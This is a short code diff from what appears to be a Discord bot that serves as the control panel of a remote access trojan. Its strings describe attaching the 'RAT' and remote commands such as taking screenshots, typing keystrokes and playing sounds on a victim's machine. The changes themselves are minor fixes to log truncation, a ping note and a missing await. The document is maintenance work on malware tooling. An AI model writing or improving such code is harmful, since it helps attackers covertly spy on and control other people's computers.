@@ -26,7 +26,7 @@ def home():
             "> `tts`: Plays a text to speech sound using windows tts engine\n"
             "> `beep`: Play a `3.5` seconds long beep at `1000Hz`\n"
             "**Misc**\n"
-            "> `ping`: Ping the bot *(ref: 5-385ms)*\n"
+            "> `ping`: Ping the bot *(ref: 0-450ms)*\n"
             "> `screenshot`: Takes a screenshot\n"
             "> `type`: Type a message with givin wpm *(words per minute)*\n"
             "**Advanced**\n"
@@ -124,7 +124,7 @@ class Dropper(discord.ui.Select):
               log_bytes = BytesIO(lC.encode("utf-8"))
               log_bytes.seek(0)  
               log_file = discord.File(log_bytes, filename=f"log_{datetime.now().date()}.log")
-              ihatediscord = lC[:1750] + "..." if len(lC) > 1750 else lC
+              ihatediscord = lC[:1950] + "..." if len(lC) > 1950 else lC
               embed = discord.Embed(title="Log", description=f"```{ihatediscord}```\n*(low level logs may be hidden)*", color=config.embedcolor)
               embed.set_footer(text=f"Log file {datetime.now().date()}")
               await interaction.response.edit_message(embed=embed, view=Dropperview(log=log_file)) 
@@ -137,7 +137,7 @@ class Dropper(discord.ui.Select):
                 embed = discord.Embed(title="Success", description=f"RAT has been attached successfully", color=config.embedcolor)  
               else:  
                 embed = discord.Embed(title="Attach failed", description=f"RAT has failed to attach\n> Error: `{mm}`", color=config.embederrorcolor) 
-              msg.edit(embed=embed, view=Dropperview())                  
+              await msg.edit(embed=embed, view=Dropperview())                  
           else:
               await interaction.response.send_message("soon inshallah", ephemeral=True)     
                      
@@ -170,7 +170,7 @@ class Refresh(discord.ui.Button):
          log_bytes = BytesIO(lC.encode("utf-8"))
          log_bytes.seek(0)  
          log_file = discord.File(log_bytes, filename=f"log_{datetime.now().date()}.log")
-         ihatediscord = lC[:1750] + "..." if len(lC) > 1750 else lC
+         ihatediscord = lC[:1950] + "..." if len(lC) > 1950 else lC
          embed = discord.Embed(title="Log", description=f"```{ihatediscord}```\n*(low level logs may be hidden)*", color=config.embedcolor)
          embed.set_footer(text=f"Log file {datetime.now().date()}")
          await interaction.response.edit_message(embed=embed, view=Dropperview(log=log_file))
